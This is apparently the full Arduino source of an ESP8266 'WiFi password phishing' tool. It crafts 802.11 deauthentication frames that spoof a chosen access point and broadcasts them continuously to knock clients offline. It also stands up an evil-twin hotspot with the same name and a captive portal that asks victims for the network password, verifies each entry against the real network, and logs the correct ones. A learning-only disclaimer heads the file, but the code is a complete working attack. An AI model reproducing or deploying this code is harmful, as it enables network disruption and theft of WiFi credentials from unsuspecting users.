/*
  ESP_Fishing v1.0
  ESP82266 自动化WiFi密码钓鱼
  by：发明控
  仓库地址：https://github.com/bilibilifmk/ESP_Fishing

  需要使用魔改SDK 否则攻击帧会被SDK忽略
  基于wifi_link_tool库开发（给个Star呗）https://github.com/bilibilifmk/wifi_link_tool
  需要上传文件系统

  1.本项目仅供验证与学习使用，请勿对他人恶意攻击
  2.对他人而已的进行攻击是违法行为
  3.本项目完全面免费开源
  4.禁止对该项目进行售卖！
  5.你的所有操作均与作者本人无关

  开源协议：General Public License v2.0 ！
*/
#include <wifi_link_tool.h>
String wifiname, wifipassword;
//攻击帧
uint8_t packet[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x01, 0x00
};

void packetset(uint8_t* mac)
{
  memcpy(&packet[10], mac, 6);
  memcpy(&packet[16], mac, 6);
  //  for (int i = 0; i < 26; i++)
  //  Serial.println(packet[i]);
}

void dy() {
  if (wifiname == "") {
    File file = SPIFFS.open("/dyconfig.html", "r");
    webServer.streamFile(file, "text/html");
    file.close();
  }
}
void dqerror () {

  File file = SPIFFS.open("/error.html", "r");
  webServer.streamFile(file, "text/html");
  file.close();

}

void indexs()

{
  if (wifiname == "") {
    File file = SPIFFS.open("/index.html", "r");
    webServer.streamFile(file, "text/html");
    file.close();
  }
}

void set()
{
  if (wifiname == "") {
    if (webServer.arg("ssid") != "" && webServer.arg("password") != "")
    {
      String ssids = webServer.arg("ssid");
      String passwords = webServer.arg("password");
      SPIFFS.remove("/WIFIssud.txt");
      File file = SPIFFS.open("/WIFIssid.txt", "w");
      file.print(ssids);
      file.close();
      SPIFFS.remove("/WIFIpassword.txt");
      file = SPIFFS.open("/WIFIpassword.txt", "w");
      file.print(passwords);
      file.close();
      webServer.send(200, "text/plain", "0");
      delay(1000);
      ESP.restart();
    }
  }
}
void getset()
{
  String ssids = "";
  String passwords = "";

  File file = SPIFFS.open("/WIFIssid.txt", "r");
  if (file) ssids = file.readString();
  file.close();

  file = SPIFFS.open("/WIFIpassword.txt", "r");
  if (file) passwords = file.readString();
  file.close();
  if (ssids != "" && passwords != "") {
    const char *ssidk = ssids.c_str();
    const char *passwordk = passwords.c_str();
    WiFi.softAP(ssidk, passwordk);
  } else
  {
    Serial.println("默认配置");
    WiFi.softAP("ESP_Fishing");
  }

}
void getlis()
{
  if (wifiname == "") {
    File file = SPIFFS.open("/jl.txt", "r");
    if (file) webServer.send(200, "text/plain", file.readString());
    file.close();
  }
}

void wifiup()
{
  if (webServer.arg("ssid") != "") {
    Serial.println("准备攻击：" + webServer.arg("ssid"));
    wifiname = webServer.arg("ssid");
    const char *ssid = wifiname.c_str();
    int networksListSize = WiFi.scanNetworks();
    int zt = 0;
    for (int i = 0; i < networksListSize; i++) {
      Serial.println(WiFi.SSID(i) + " " + WiFi.RSSI(i));
      if (WiFi.SSID(i) == ssid) {
        packetset(WiFi.BSSID(i));
        zt = 1;
      }
    }

    if (zt == 1) {
      Serial.println("开始攻击");
      webServer.send(200, "text/plain", "1");
      delay(2000);
      WiFi.softAP(wifiname);
      digitalWrite(2, HIGH); //关闭指示灯
    } else {
      wifiname = "";
      Serial.println("未找到设备");
      webServer.send(200, "text/plain", "0");
    }
  }

  if (webServer.arg("password") != "")

  {
    if (wifiname != "") {
      Serial.println(wifiname + "密钥提交：" + webServer.arg("password"));
      const char *ssid = wifiname.c_str();
      const char *password = webServer.arg("password").c_str();
      WiFi.begin(ssid, password);
      Serial.print("正在测试密钥正确性");
      unsigned long millis_time = millis();
      while ((WiFi.status() != WL_CONNECTED) && (millis() - millis_time < 8000))
      {
        delay(500);
        Serial.print(".");
      }
      if (WiFi.status() == WL_CONNECTED)
      {

        Serial.print("密钥正确 写入数据");
        File file = SPIFFS.open("/jl.txt", "a+");
        file.print(wifiname + "," + webServer.arg("password") + ",");
        file.close();
        webServer.send(200, "text/plain", "1");//正确
        Serial.print("钓鱼完成，重启....");
        delay(2000);
        ESP.restart();
      }
      else
      {
        Serial.print("密钥错误继续进行");
        webServer.send(200, "text/plain", "0");//错误

      }



    } else
    {
      webServer.send(200, "text/plain", "0");//错误
    }



  }

}

void setup() {
  Serial.begin(115200);
  info();
  WiFi.mode(WIFI_AP_STA);
  SPIFFS.begin();
  getset();
  WiFi.disconnect();

  //后台
  webServer.on("/", indexs);
  //钓鱼设置
  webServer.on("/dyconfig", dy);
  //钓鱼页
  webServer.on("/error", dqerror);
  //扫描
  webServer.on("/wifiscan", wifiScan);
  //请求
  webServer.on("/wifi", wifiup);
  //记录列表
  webServer.on("/get", getlis);
  //设置WiFi
  webServer.on("/set", set);

  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.onNotFound([]() {
    File file = SPIFFS.open("/error.html", "r");
    webServer.streamFile(file, "text/html");
    file.close();
  });
  webServer.begin();

  pinMode(2, OUTPUT);   //设置指示灯
  digitalWrite(2, LOW);
}

void loop() {
  webServer.handleClient();
  if (wifiname != "") {
    MDNS.update();
    dnsServer.processNextRequest();
    wifi_send_pkt_freedom(packet, 26, 0);
    //发送攻击帧
    delay(1);
  }


}
